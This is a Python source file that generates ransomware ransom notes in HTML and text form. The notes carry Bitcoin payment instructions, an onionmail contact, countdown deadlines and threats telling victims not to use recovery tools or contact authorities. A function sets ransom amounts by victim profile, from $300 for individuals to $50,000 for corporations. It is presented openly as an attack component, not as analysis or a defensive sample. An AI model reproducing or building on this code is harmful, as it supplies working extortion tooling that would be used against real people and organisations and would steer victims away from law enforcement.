# -*- coding: utf-8 -*-
"""Ransom note generator -- HTML/text templates with crypto payment info.

Author: zxwn
"""
import os, uuid


def generate_html_note(
    btc_address: str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    amount_usd: int = 500,
    contact_email: str = "decrypt@onionmail.org",
    deadline_hours: int = 72,
) -> str:
    """Generate HTML ransom note."""
    uid = uuid.uuid4().hex[:8].upper()
    return """<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Files Encrypted — {uid}</title>
<style>
body{{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.card{{background:#1a1a1a;border:1px solid #c0392b;border-radius:8px;padding:40px;max-width:600px;text-align:center}}
h1{{color:#c0392b}} .btc{{background:#222;padding:10px;border-radius:4px;word-break:break-all;color:#f39c12;font-size:14px}}
.timer{{color:#e74c3c;font-size:24px;margin:20px 0}}
.steps{{text-align:left;margin:20px 0;line-height:2}}
</style></head>
<body>
<div class="card">
<h1>YOUR FILES ARE ENCRYPTED</h1>
<p>ID: <strong>{uid}</strong></p>
<p>All documents, photos, databases and other files on this system have been encrypted with military-grade AES-256 + RSA-2048.</p>
<div class="timer">TIME REMAINING: {deadline} HOURS</div>
<h3>Payment Instructions</h3>
<div class="steps">
<p>1. Acquire ${amount} USD worth of Bitcoin</p>
<p>2. Send exactly to this address:</p>
<p class="btc">{btc}</p>
<p>3. After payment, email <strong>{email}</strong> with your ID: {uid}</p>
<p>4. You will receive the decryption key within 12 hours</p>
</div>
<p><strong>DO NOT:</strong> rename files, use third-party tools, or contact law enforcement.<br>Files will be permanently destroyed after the deadline.</p>
<p style="color:#666;font-size:12px">This is an automated message. Replying to this note is futile.</p>
</div>
</body>
</html>""".format(
        uid=uid, deadline=deadline_hours, amount=amount_usd, btc=btc_address, email=contact_email
    )


def generate_txt_note(
    btc_address: str = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    amount_usd: int = 500,
    contact_email: str = "decrypt@onionmail.org",
    deadline_hours: int = 72,
) -> str:
    """Generate plaintext ransom note for desktop wallpaper / text files."""
    uid = uuid.uuid4().hex[:8].upper()
    return """========================================
        YOUR FILES ARE ENCRYPTED
========================================

ID: {uid}

All your files have been encrypted with
AES-256 + RSA-2048 encryption.

NO ONE can recover your files without
our private decryption key.

========================================
        PAYMENT INSTRUCTIONS
========================================

1. Buy ${amount} USD in Bitcoin
2. Send to: {btc}
3. Email {email}
4. Include your ID: {uid}
5. Receive decryptor within 12 hours

DEADLINE: {deadline} HOURS

WARNING:
- Do NOT rename encrypted files
- Do NOT use file recovery tools
- Do NOT contact authorities
- Files will be DESTROYED after deadline

========================================
""".format(
        uid=uid, amount=amount_usd, btc=btc_address, email=contact_email, deadline=deadline_hours
    )


def note_variants(btc: str) -> dict:
    """Generate multiple note variants for different target profiles."""
    return {
        "corporate": generate_html_note(btc, amount_usd=50000, deadline_hours=168),
        "small_business": generate_txt_note(btc, amount_usd=2500, deadline_hours=96),
        "individual": generate_txt_note(btc, amount_usd=300, deadline_hours=72),
    }


if __name__ == "__main__":
    print(generate_txt_note())
